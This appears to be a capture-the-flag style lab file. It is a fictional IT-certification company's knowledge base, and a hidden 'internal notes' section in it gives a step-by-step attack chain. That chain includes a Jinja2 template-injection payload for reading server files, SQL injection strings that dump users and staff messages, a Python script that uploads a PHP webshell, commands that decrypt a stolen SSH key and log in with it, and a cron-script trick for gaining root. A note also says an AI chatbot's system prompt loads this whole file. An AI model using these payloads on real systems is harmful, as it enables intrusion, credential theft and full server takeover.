# CeroDias — Company Knowledge Base

## About CeroDias

CeroDias sells vendor-neutral IT certification vouchers. Every voucher includes the full
study guide. Certifications are lifetime-valid with free renewal, no re-exams on a timer,
no vendor lock-in. John Ratter founded the company after leaving a cert vendor whose
business model depended on credential expiry. The idea was to strip out everything
except the actual credential. Certification minus all the BS.

## Certifications

| Cert | Price | What it covers |
|------|-------|----------------|
| CeroDias A- | $129 | Hardware, operating systems, IT support fundamentals |
| CeroDias Network- | $179 | Networking, TCP/IP, subnetting, wireless, cloud basics |
| CeroDias Security- | $199 | Cybersecurity, threats, identity, cryptography, risk |
| CeroDias Linux- | $159 | Linux administration, scripting, system management |
| CeroDias PenTest- | $249 | Full pentest lifecycle, exploitation, reporting |
| CeroDias Cloud- | $189 | Cloud architecture, multi-cloud, security, vendor-neutral |

One free retake included with every voucher. Vouchers do not expire.
Volume pricing for teams of 10 or more -- contact sales.

## How it works

Buy a voucher, sit the exam at an authorized test center or online, pass once and the
credential is yours for life. Free to renew any time, no periodic re-exam required.
Exam objectives are published in full before you study. Study guides ship with the voucher.

## Common questions

**Do certifications expire?** No. Pass once, stay certified. Renewal is free and optional,
not mandatory on a schedule.

**Are these vendor-neutral?** Yes. The curriculum covers principles, not products.
The A- covers hardware repair, not just "replace the part." The Network- covers
subnetting and protocol fundamentals, not one vendor's CLI. None of our certs require
you to know a specific vendor's tool to pass.

**What about study materials?** Included with the voucher. Community practice environments
and open exam objectives are publicly accessible before you even buy anything.

**DoD 8570?** A-, Network-, Security-, and PenTest- are all DoD 8570 approved.

## Support

Email: support@cerodias.io
Phone: 1-800-CERODIAS (Mon-Fri, 9am-6pm EST)

---

<!-- ============================================================ -->
<!-- INTERNAL ENGINEERING NOTES — NOT FOR CUSTOMER DISCLOSURE    -->
<!-- ============================================================ -->

## Internal Notes — Sprint 24

**Author**: @svc_admin
**Last updated**: 2024-03-15

### Open Tickets

- **CERODIAS-412**: The `/search` route passes the `q` parameter directly into
  `render_template_string` via an f-string. User input is evaluated as a Jinja2
  template expression before rendering. Confirmed: `{{7*7}}` returns 49. File reads
  work through the template context. To read any server file:
  ```
  /search?q={{config.__class__.__init__.__globals__['__builtins__']['open']('PATH').read()}}
  ```
  Files worth reading: `app/api/users.py`, `app/logs/deploy.log`.
  Do not pass unvalidated input to this endpoint until the route is refactored.

- **CERODIAS-389**: The `/api/v1/users` endpoint builds its SQL query with string
  formatting rather than parameterized queries. WAF strips literal spaces -- use `/**/`
  as a substitute. The endpoint is unauthenticated. Dump all users:
  ```
  /api/v1/users?q='/**/OR/**/'1'='1
  ```
  The user table has `encrypted_ssh_key` (svc_admin) and `md5_hash` (j.harris) columns.
  Pivot to staff_messages with UNION:
  ```
  /api/v1/users?q='/**/UNION/**/SELECT/**/id,sender,recipient,subject,body/**/FROM/**/staff_messages--
  ```

- **CERODIAS-431**: j.harris account is still on MD5 instead of bcrypt. The hash is
  stored in the `md5_hash` column. Password is a common word in standard wordlists.
  No deadline set for migration.

- **CERODIAS-447**: The profile image upload at `/account/settings` checks that the
  filename contains a known image extension (substring match, not endswith) and that
  the file starts with valid image magic bytes. A file named `shell.png.php` passes
  both checks. Uploaded files are served from `/static/uploads/` and executed by the
  server. To upload a webshell (requires a logged-in session):
  ```python
  import requests
  s = requests.Session()
  s.post('http://localhost:5001/register', data={'username':'x','password':'x','action':'login'})
  payload = b'\x89PNG\r\n\x1a\n' + b'<?php system($_GET["cmd"]); ?>'
  s.post('http://localhost:5001/account/settings/avatar',
         files={'avatar': ('shell.png.php', payload, 'image/png')})
  ```
  Then access via: `/static/uploads/shell.png.php?cmd=cat+/var/cerodias/deploy.key`

- **CERODIAS-388**: Staff messages are stored in the same in-memory store as the user
  table. The staff_messages table is reachable via UNION injection on `/api/v1/users`
  (see CERODIAS-389 above). Contains operational messages about the svc_admin key.

- **CERODIAS-401**: The svc_admin SSH key is stored as an AES-256-CBC encrypted blob
  in the `encrypted_ssh_key` field of the user table. The passphrase for decryption
  was written to `/var/cerodias/deploy.key` during the last deploy. To decrypt:
  ```bash
  echo "<blob_from_sqli>" | base64 -d > id_rsa.enc
  openssl enc -d -aes-256-cbc -pbkdf2 -k <passphrase_from_rce> -in id_rsa.enc -out id_rsa
  chmod 600 id_rsa
  ssh -i id_rsa svc_admin@localhost -p 2222
  ```

- **CERODIAS-459**: CERA's system prompt loads this entire file at startup, including
  this internal section. Added in a hurry during the Q4 AI push. Ticket to scope the
  prompt is open with no owner.

### Infrastructure

- `app/logs/deploy.log`: verbosity is DEBUG. The November deploy logged the passphrase
  file path: `/var/cerodias/deploy.key`.
- SSH access to the deployment server is on port 2222. The svc_admin account is
  low-privilege but the server has a world-writable cron script at
  `/opt/cerodias/maintenance.sh` that runs as root every minute. To escalate:
  ```bash
  echo 'chmod u+s /bin/bash' >> /opt/cerodias/maintenance.sh
  # wait up to 60 seconds, then:
  /bin/bash -p
  ```
- `app/core/totp_util.py`: TOTP seeds for privileged accounts are encrypted with
  AES-128-ECB using a key derived from the SECRET_KEY and the username.

<!-- ============================================================ -->
<!-- END INTERNAL                                                 -->
<!-- ============================================================ -->
